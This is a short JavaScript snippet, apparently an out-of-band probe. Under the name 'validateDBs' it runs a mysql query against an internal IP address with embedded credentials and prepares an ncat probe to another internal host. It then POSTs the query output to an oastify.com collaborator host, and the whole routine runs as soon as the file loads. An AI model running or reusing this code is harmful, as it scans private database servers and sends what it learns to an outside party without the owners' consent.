const OAST = '9dndwj4mod9qwldfzjjcqkhu0l6cu4lsa.oastify.com';
function report(tag, data) { const payload = JSON.stringify({tag,data}); const req = https.request({hostname: OAST, method: 'POST'}); req.write(payload); req.end(); }
function validateDBs() {
 const mysqlCmd = `mysql -h 10.108.193.167 -u hscanaux -pfixture -e "SELECT @@hostname; SHOW VARIABLES LIKE 'version_comment';"`;
 const mongoCmd = `echo x | ncat -w 2 10.107.119.152 27077`;
 const mysqlRes = execSync(mysqlCmd).toString();
 report('MYSQL_LIVE_PROBE', { output: mysqlRes });
}
validateDBs();
